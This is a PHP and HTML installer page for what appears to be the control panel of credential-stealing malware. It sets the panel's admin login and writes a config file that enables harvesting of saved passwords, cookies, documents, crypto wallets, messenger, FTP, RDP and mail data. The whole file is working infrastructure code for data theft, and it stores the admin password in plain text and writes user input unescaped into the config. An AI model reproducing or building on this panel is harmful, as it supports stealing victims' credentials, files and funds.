<?php
	if(isset($_POST['us_login']) && isset($_POST['us_password']) && isset($_POST['us_password_']))
	{
		$login = $_POST['us_login'];
		$password = $_POST['us_password'];
		$password_ = $_POST['us_password_'];
		$msgs = array();
		if(empty($_POST['us_login']))
			$msgs[] = 'login is missing';
		if(empty($password))
			$msgs[] = 'password is missing';
		if(empty($password_))
			$msgs[] = 'you must repeat password';
		if(!count($msgs))
		{
			if(strcmp($password, $password_) !== 0)
			{
				$msgs[] = 'passwords aren\'t match';
			}
			else
			{
				$strvar = implode(PHP_EOL, array(
				"us_login\t\t= \"$login\"",
				"us_password\t\t= \"$password\"",
				"ac_passwords\t= \"1\"",
				"ac_cookies\t\t= \"1\"",
				"ac_docs\t\t\t= \"1\"",
				"ac_docs_ft\t\t= \"*.txt|*.doc\"",
				"ac_docs_dr\t\t= \"1\"",
				"ac_docs_sz\t\t= \"2000000\"",
				"ac_docs_st\t\t= \"1\"",
				"ac_wallets\t\t= \"1\"",
				"ac_messengers\t= \"1\"",
				"ac_ftp_cl\t\t= \"1\"",
				"ac_rdp\t\t\t= \"1\"",
				"ac_mail\t\t\t= \"1\"",
				"al_duplicate\t= \"1\""));
				file_put_contents('includes/config.ini', $strvar);
				$msgs[] = 'success<br> now you\'\'ll redirect to login page';
			}
		}
		echo ucwords(implode('<br> ', $msgs));
		exit;
	}
?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf8"/>
		<link rel="stylesheet" href="assets/css/bootstrap.min.css">
		<link rel="stylesheet" href="assets/css/animate.css">
		<link rel="shortcut icon" href="assets/img/favicon.png" type="image/png">
		<script src="assets/js/jquery.js"></script>
		<script src="assets/js/bootstrap.min.js"></script>
		<script src="assets/js/bootstrap-notify.min.js"></script>
		<script>
			$(document).ready(function()
			{
				$(document).on('submit', 'form', function()
				{
					$.post('', 
					{
						us_login: $('[name="us_login"]').val(),
						us_password: $('[name="us_password"]').val(),
						us_password_: $('[name="us_password_"]').val()
					}, function(data)
					{
						$.notify(
						{
							message: data
						},
						{
							animate:
							{
								enter: 'animated flipInY',
								exit: 'animated flipOutX'
							},
							type: data.indexOf('Success') != -1 ? 'success' : 'danger',
							delay: 2500,
							placement:
							{
								from: 'bottom',
								align: 'left'
							}
						});
						if(data.indexOf('Success') != -1) 
						{
							setTimeout(function()
							{
								window.location = '';
							}, 1500);
						}
					})
					return false;
				});
			});
		</script>
		<title>Welcome!</title>
	</head>
	<body style="background: url('assets/img/bg.png')">
		<div class="container">
			<div class="row">
				<div style="margin-top: 40px;" class="col-md-6 col-md-offset-3">
					<div class="panel panel-default">
						<div class="panel-heading">Beginning</div>
						<div class="panel-body" style="margin-bottom: -15px;">
							<div class="well well-lg">
								To setup control panel enter the following information
							</div>
							<form>
								<div class="form-group">
									<input class="form-control" id="focusedInput" name="us_login" type="text" placeholder="Login">
								</div>
								<div class="form-group">
									<input class="form-control" id="focusedInput" name="us_password" type="text" placeholder="Password">
								</div>
								<div class="form-group">
									<input class="form-control" id="focusedInput" name="us_password_" type="password" placeholder="Repeat password">
								</div>
								<div class="form-group">
									<input class="btn btn-default btn-block" type="submit" value="Continue">
								</div>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>